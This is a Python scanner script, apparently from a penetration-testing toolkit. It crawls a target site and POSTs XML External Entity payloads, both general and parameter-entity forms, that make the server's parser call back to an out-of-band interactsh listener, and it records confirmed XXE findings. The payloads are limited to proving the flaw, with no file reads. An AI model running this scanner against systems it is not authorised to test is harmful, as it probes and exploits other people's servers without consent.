#!/usr/bin/env python3
r"""xxe_harness.py - XML External Entity injection detector (black-box, anonymous, OOB-proven).

Confirm oracle (zero-FP by construction, identical correlation to the proven SSRF stage): we POST XML
bodies carrying an external entity that points at our out-of-band listener with a UNIQUE per-injection
marker. A finding is emitted ONLY when the TARGET SERVER's XML parser resolves that entity and reaches
our canary - i.e. an OOB callback lands for that exact marker. A reflected string, a 200, or a parse
error is NEVER a finding: without the server contacting OUR unique host there is no proof.

Two payload shapes per injection, both pointed only at our listener (no file:// exfil, no metadata,
no escalation - capability proof only):
  * general external entity   <!ENTITY x SYSTEM "http://<m>.<dom>/<m>">  &x;
  * parameter entity (blind)  <!ENTITY % p SYSTEM "http://<m>.<dom>/<m>.dtd"> %p;

Content-types tried: application/xml, text/xml. Reuses oob.InteractshOOB (stdlib-only client
lifecycle + marker correlation). Self-contained: NABLUS_TARGET / NABLUS_SEEDS, writes
xxe_findings.json. `--selftest` checks payload construction offline (no network).
"""
from __future__ import annotations  # noqa
import os, sys, json, time, http.cookiejar, urllib.request, urllib.parse, urllib.error, pathlib, uuid
from urllib.parse import urljoin, urlsplit
from html.parser import HTMLParser
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))   # so `import oob` works under -I too
from oob import InteractshOOB

BASE = os.environ.get("NABLUS_TARGET", "http://127.0.0.1:8099").rstrip("/")
OUT = r"C:\Users\Laith\nabulus-agent\xxe_findings.json"
SEEDS = [s.strip() for s in os.environ.get("NABLUS_SEEDS", "").split(",") if s.strip()]
ITSH_CLIENT = os.environ.get("NABLUS_ITSH_CLIENT",
                             r"C:\Users\Laith\nabulus-tools\bin\interactsh-client.exe")
ITSH_SERVER = os.environ.get("NABLUS_ITSH_SERVER") or None
WORKDIR = os.path.dirname(os.path.abspath(__file__))
PACE = float(os.environ.get("NABLUS_PACE", "0.02"))
POLL_WAIT = 14.0

# endpoints that commonly accept an XML / SOAP body server-side
XML_PATHS = ["/api/xml", "/api/soap", "/soap", "/api/import", "/import", "/api/upload",
             "/upload", "/api/parse", "/api/feed", "/rss", "/api/rss", "/xmlrpc.php",
             "/api/document", "/api/convert", "/ws", "/api/ws", "/services", "/api/data"]
CTYPES = ["application/xml", "text/xml"]


def _marker() -> str:
    return "x" + uuid.uuid4().hex[:10]


def classic_payload(marker, domain):
    return (f'<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE r [<!ENTITY x SYSTEM "http://{marker}.{domain}/{marker}">]>'
            f'<r>&x;</r>')


def param_payload(marker, domain):
    return (f'<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE r [<!ENTITY % p SYSTEM "http://{marker}.{domain}/{marker}.dtd"> %p;]>'
            f'<r>probe</r>')


def post(url, body, ctype):
    if PACE:
        time.sleep(PACE)
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
    req = urllib.request.Request(url, data=body.encode(), method="POST",
                                 headers={"Content-Type": ctype, "User-Agent": "nablus-xxe/1.0"})
    try:
        r = op.open(req, timeout=10)
        return r.status, r.read(4000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception:
        return 0, ""


def _plain_get(url):
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
    try:
        r = op.open(urllib.request.Request(url), timeout=10)
        return r.read(120000).decode("utf-8", "replace")
    except Exception:
        return ""


class _Links(HTMLParser):
    def __init__(self):
        super().__init__(); self.hrefs = []
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        for k in ("href", "action", "src"):
            if a.get(k):
                self.hrefs.append(a[k])


def candidates():
    paths, seen, frontier = set(XML_PATHS), set(), [BASE + "/"]
    for _ in range(2):
        nxt = []
        for u in frontier:
            if u in seen or len(seen) >= 15:
                continue
            seen.add(u)
            p = _Links()
            try:
                p.feed(_plain_get(u))
            except Exception:
                pass
            for h in p.hrefs:
                link = urljoin(u, h).split("#")[0]
                if link.startswith(BASE) and link not in seen and "logout" not in link.lower():
                    nxt.append(link)
                    paths.add(urlsplit(link).path)
        frontier = nxt
    for s in SEEDS:
        paths.add(urlsplit(s if "://" in s else BASE + ("" if s.startswith("/") else "/") + s).path)
    return sorted(p for p in paths if p)


def main():
    cands = candidates()
    print(f"target: {BASE} | XXE candidate endpoints: {len(cands)} | ctypes: {len(CTYPES)}")

    provider = InteractshOOB(ITSH_CLIENT, WORKDIR, server=ITSH_SERVER, poll_wait=POLL_WAIT)
    try:
        provider.start()
    except Exception as exc:
        print(f"[xxe] ABORT: interactsh unavailable ({exc!r}); cannot prove XXE -> 0 findings")
        pathlib.Path(OUT).write_text("[]", encoding="utf-8")
        return 0
    print(f"[xxe] OOB session domain: {provider.domain}")

    injected = {}                                     # marker -> (endpoint_path, ctype, shape)
    try:
        for path in cands:
            for ctype in CTYPES:
                for shape, builder in (("classic", classic_payload), ("param-entity", param_payload)):
                    marker = _marker()
                    body = builder(marker, provider.domain)
                    post(BASE + path + "?_=" + marker, body, ctype)
                    injected[marker] = (path, ctype, shape)
        provider.wait()
        seen = provider.seen_markers()
        if not seen:
            time.sleep(5)
            seen = provider.seen_markers()

        findings, emitted = [], set()
        for marker, (path, ctype, shape) in injected.items():
            if marker not in seen or path in emitted:
                continue
            emitted.add(path)
            evidence = provider.interactions_for(marker)
            proto = ",".join(sorted({e.get("protocol", "?") for e in evidence})) or "oob"
            findings.append({
                "class": "xxe", "severity": "high", "endpoint": BASE + path, "param": f"XML body ({ctype})",
                "proof": {"marker": marker, "shape": shape, "content_type": ctype,
                          "oob_payload": provider.payload(marker), "protocols": proto,
                          "interactions": evidence},
                "proof_request": f"POST {BASE + path}  Content-Type: {ctype}  <external entity -> "
                                 f"http://{marker}.{provider.domain}/>",
                "validated_by": (f"XML parser resolved our external entity ({shape}) - out-of-band "
                                 f"{proto} callback to {marker}.{provider.domain} proves XXE"),
                "confirmed": True,
            })
            print(f"[xxe] CONFIRMED: {path} [{shape}/{ctype}]  (OOB {proto} via {marker})")
    finally:
        provider.stop()

    pathlib.Path(OUT).write_text(json.dumps(findings, indent=2), encoding="utf-8")
    print(f"[xxe] confirmed XXE findings: {len(findings)} -> {OUT}")
    return 0


def selftest():
    ok = True
    m, d = "xdeadbeef01", "oob.example.net"
    for name, body in (("classic", classic_payload(m, d)), ("param-entity", param_payload(m, d))):
        has_marker = f"{m}.{d}" in body
        has_doctype = "<!DOCTYPE" in body and "SYSTEM" in body
        well_wrapped = body.startswith("<?xml") and body.rstrip().endswith("</r>")
        good = has_marker and has_doctype and well_wrapped
        if not good:
            ok = False
        print(f"  [{'OK' if good else 'FAIL'}] {name}: marker={has_marker} doctype={has_doctype} wrapped={well_wrapped}")
    # negative: a payload must NOT point anywhere but our listener (no file://, no metadata ip)
    allp = classic_payload(m, d) + param_payload(m, d)
    safe = ("file://" not in allp) and ("169.254.169.254" not in allp)
    if not safe:
        ok = False
    print(f"  [{'OK' if safe else 'FAIL'}] capability-only: no file:// / no metadata ip = {safe}")
    print("SELFTEST", "PASS" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    if "--selftest" in sys.argv:
        raise SystemExit(selftest())
    raise SystemExit(main())
